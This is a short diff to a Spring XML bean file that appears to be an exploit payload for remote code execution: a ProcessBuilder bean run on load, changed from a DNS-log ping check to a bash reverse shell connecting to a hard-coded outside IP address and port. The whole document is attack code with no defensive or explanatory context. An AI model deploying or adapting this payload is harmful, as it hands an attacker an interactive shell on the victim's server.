@@ -6,8 +6,9 @@
         <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
             <constructor-arg >
             <list>
-			<value>ping</value>
-            <value>r2spj3.dnslog.cn</value>
+		<value>bash</value>
+		<value>-c</value>
+		<value><![CDATA[bash -i >& /dev/tcp/139.159.213.79/55555 0>&1]]></value>
             </list>
             </constructor-arg>
         </bean>
